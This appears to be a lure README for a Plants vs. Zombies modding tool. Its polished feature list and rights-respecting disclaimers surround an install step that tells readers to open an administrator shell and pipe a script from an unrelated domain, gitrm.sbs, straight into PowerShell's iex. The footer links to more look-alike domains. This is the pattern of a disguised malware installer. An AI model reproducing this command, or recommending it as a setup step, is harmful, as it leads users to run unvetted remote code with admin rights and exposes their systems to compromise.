# Plants vs. Zombies Mod Studio

> A rights-respecting modding and level-design workspace for fan projects built around the Plants vs. Zombies style of play.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitrm.sbs?get=pvz | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Pvz modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Pvz.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

## TL;DR - Quick Summary

Plants vs. Zombies Mod Studio offers a level editor, balance worksheet, asset manifest, localization helper, and package validator for original fan content. It helps creators organize ideas while keeping licensing and distribution boundaries clear.

## Core Features

- ✅ **Level Editor** — Place lanes, waves, objectives, and interactive events.
- ✅ **Balance Worksheet** — Compare cost, recharge, health, and reward values.
- ✅ **Asset Manifest** — Track source, author, license, and required attribution.
- ✅ **Localization Helper** — Review text length and missing translations.
- ✅ **Package Validator** — Check manifests, paths, and metadata before sharing.
- ✅ **Accessibility Notes** — Prompt for contrast, readable text, and reduced-motion options.
- ✅ **Changelog Generator** — Keep release notes understandable for players.

## Usage

```bash
# Create a new original level
python -m pvz_studio level new --name garden-demo

# Validate assets and metadata
python -m pvz_studio validate ./mods/garden-demo

# Preview the level locally
python -m pvz_studio preview ./mods/garden-demo

# Package a review copy
python -m pvz_studio package ./mods/garden-demo --output ./dist
```

## Configuration

> [!NOTE]
> The studio reads `studio.config.yaml` for local paths and display preferences. It does not contact a game service or bypass platform controls.

```yaml
project: garden-demo
asset_root: ./assets/original
output: ./dist
language: en
reduced_motion: true
```

## Screenshots

- Level editor: `screenshots/level-editor.png`
- Balance worksheet: `screenshots/balance.png`
- Asset manifest: `screenshots/assets.png`
- Package report: `screenshots/package.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Level preview is empty | Confirm the level manifest points to an existing local asset root. |
| Validator reports an unknown license | Add a clear source and permission record to the asset manifest. |
| Text overflows | Shorten the string or enable the locale overflow warning. |
| Package is incomplete | Run `validate` before `package` and inspect the report. |

## Use Cases

- **Original Fan Levels** — Prototype new objectives and wave design.
- **Balance Experiments** — Compare mechanics without changing a live game.
- **Localization Projects** — Coordinate translations and text limits.
- **Creator Education** — Teach asset provenance and responsible distribution.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Do not redistribute copyrighted game assets, bypass DRM, or present fan work as official. Obtain permission for third-party material and follow the relevant platform and trademark rules.

> [!TIP]
> Run the asset manifest review before every public release, even for a small update.

## License

This project is licensed under the MIT License — see the `LICENSE` file for details.

## Tags

`pvz` `modding` `level-editor` `fan-project` `asset-management` `localization` `game-design` `rights-respecting`

[gitrm.sbs](https://gitrm.sbs?t=pvz) | [gitrm.cfd](https://gitrm.cfd?t=pvz) | [viewgit.sbs](https://viewgit.sbs?t=pvz) | [gitsl.xyz](https://gitsl.xyz?t=pvz) | [gitview.sbs](https://gitview.sbs?t=pvz)
